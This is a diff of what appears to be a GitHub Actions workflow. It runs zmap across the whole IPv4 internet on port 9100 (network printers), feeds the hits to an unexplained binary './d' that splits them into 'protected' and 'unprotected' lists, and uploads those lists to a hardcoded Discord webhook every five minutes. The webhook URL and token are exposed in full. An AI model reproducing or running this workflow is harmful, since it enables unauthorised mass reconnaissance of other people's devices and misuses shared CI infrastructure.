@@ -46,25 +46,8 @@ jobs:
         run: |
           echo "🚀 Starting zmap → d pipeline..."
           
-          # generate 10M random IPs so zmap has targets to scan
-          echo "🔄 Generating 10M random IPs..."
-          python3 -c "
-import random, ipaddress
-excluded = [ipaddress.ip_network(x) for x in [
-    '0.0.0.0/8','10.0.0.0/8','127.0.0.0/8','172.16.0.0/12',
-    '192.168.0.0/16','169.254.0.0/16','224.0.0.0/4','240.0.0.0/4',
-    '100.64.0.0/10','192.0.0.0/24','198.18.0.0/15'
-]]
-def gen():
-    while True:
-        ip = f'{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'
-        a = ipaddress.ip_address(ip)
-        if not any(a in n for n in excluded): return ip
-with open('targets.txt', 'w') as f:
-    for _ in range(10000000): f.write(gen() + '\n')
-"
-          
-          nohup bash -c 'zmap -p 9100 -q -B 800M -w targets.txt | ./d' > scanner.log 2>&1 &
+          # scan the whole internet (0.0.0.0/0), no target file needed
+          nohup bash -c 'zmap -p 9100 -q -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
 
@@ -75,34 +58,28 @@ with open('targets.txt', 'w') as f:
           WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
           LAST_FILE_PING=0
           
-          # truncate scanner.log to start fresh
           > scanner.log
           
           while [ $SECONDS -lt $END_TIME ]; do
-            # check if scanner is alive
             if ! kill -0 $(cat scanner.pid) 2>/dev/null; then
               echo "⚠️ Scanner died, restarting..."
               > scanner.log
-              nohup bash -c 'zmap -p 9100 -q -B 800M -w targets.txt | ./d' > scanner.log 2>&1 &
+              nohup bash -c 'zmap -p 9100 -q -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
               echo $! > scanner.pid
             fi
             
-            # print new scanner logs every 2 seconds
             tail -n 1 scanner.log 2>/dev/null
             UPTIME_MIN=$((SECONDS / 60))
             
             NOW=$SECONDS
-            # send files to discord every 5 minutes (300s)
             if [ $((NOW - LAST_FILE_PING)) -ge 300 ]; then
               LAST_FILE_PING=$NOW
               echo "📤 Sending 5-minute file update to Discord..."
               
-              # count lines
               BIG=$(wc -l < big.txt 2>/dev/null || echo 0)
               PROT=$(wc -l < protected.txt 2>/dev/null || echo 0)
               UNPROT=$(wc -l < unprotected.txt 2>/dev/null || echo 0)
               
-              # upload all 3 text files to discord
               curl -s -F "file1=@big.txt" \
                    -F "file2=@protected.txt" \
                    -F "file3=@unprotected.txt" \
